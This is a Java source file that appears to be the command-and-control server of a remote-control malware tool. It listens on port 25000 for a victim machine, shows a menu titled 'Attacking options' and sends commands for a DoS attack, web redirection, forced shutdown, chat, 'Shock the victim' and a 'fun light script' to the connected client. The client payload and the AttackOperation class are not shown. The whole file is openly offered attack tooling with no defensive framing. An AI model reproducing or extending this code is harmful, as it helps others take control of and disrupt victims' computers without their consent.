import java.net.*;
import java.util.*;
import java.io.*;
public class Server {
	static int port = 25000;
	static ServerSocket ss;
	static Socket s;
	static DataInputStream din;
	static DataOutputStream dout;
	static BufferedReader br;
	static String send="",recive="";
	static Scanner in = new Scanner(System.in);
	AttackOperation ao = new AttackOperation();
	public void openConnection(){
		try{
			ss = new ServerSocket(port);
			s = ss.accept();
			System.out.println("Connection established with client at port :"+port);
			
			int option=optionForAttacking();
			
			din = new DataInputStream(s.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
			br = new BufferedReader(new InputStreamReader(System.in));
			
			while(option<7){
				
				if(option == 1){
					dout.writeUTF("dos");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option== 2){
					ao.webAttack(din,dout,br);
				}
				
				if(option == 3){
					dout.writeUTF("shut");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option == 4){
					try{
						ChatWithClient cvc = new ChatWithClient();
						send = "chat";
						dout.writeUTF(send);
						cvc.Chat(port+1);
						recive = din.readUTF();
						System.out.println(recive);
					}
					catch (Exception e){
						System.out.println("chat ended !");
					}
				}
				
				if(option == 5){
					dout.writeUTF("shock");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option == 6){
					dout.writeUTF("light");
					recive = din.readUTF();
					System.out.println(recive);
				}
					
					
				
				option = optionForAttacking();
			}
			
			s.close();
			ss.close();

			
		}
		catch(Exception e){
			System.out.println("Error accured in connection..");
			System.out.println(e.getMessage());
		}
	}
	
	public static int optionForAttacking() throws IOException{
		
		int option=-1;
		System.out.println("\n\nAttacking options:");
		System.out.println("1: Dos Attack");
		System.out.println("2: Web redirecting");
		System.out.println("3: Shutdown the system");
		System.out.println("4: chat with client");
		System.out.println("5: Shock the victim");
		System.out.println("6: Fun light script");
		System.out.print("Enter your choise:");
		option = in.nextInt();
		return option;
	}
	

	
	
	

}
